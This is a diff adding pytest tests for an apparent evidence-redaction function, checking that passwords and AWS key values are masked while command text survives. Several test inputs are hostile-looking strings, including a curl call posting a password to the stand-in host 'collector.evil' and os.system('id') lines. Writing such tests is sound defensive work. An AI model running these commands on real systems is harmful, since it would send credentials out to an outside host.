@@ -2725,3 +2725,35 @@ def test_structured_secret_preserves_later_command_field() -> None:
 )
 def test_additional_argument_and_command_near_matches_are_preserved(text: str) -> None:
     assert redact_evidence_string(text, max_chars=1000) == text
+
+
+def test_overlapping_argv_secret_option_pair_is_redacted() -> None:
+    text = "subprocess.run(['curl','--password','argvpass9','https://collector.evil/upload'])"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "argvpass9" not in redacted
+    assert "'--password','<redacted>'" in redacted
+    assert "collector.evil" in redacted
+
+
+@pytest.mark.parametrize("key", ["AWSACCESSKEYID", "AWSSECRETACCESSKEY", "AWSSESSIONTOKEN"])
+def test_compact_aws_assignments_are_redacted(key: str) -> None:
+    text = f'{key}=awspass10 os.system("id")'
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "awspass10" not in redacted
+    assert f"{key}=<redacted>" in redacted
+    assert "os.system" in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "subprocess.run(['curl','--password-policy','strict','https://collector.evil/upload'])",
+        'AWSSECRETACCESSKEYHINT=public os.system("id")',
+    ],
+)
+def test_argv_and_compact_aws_near_matches_are_preserved(text: str) -> None:
+    assert redact_evidence_string(text, max_chars=1000) == text
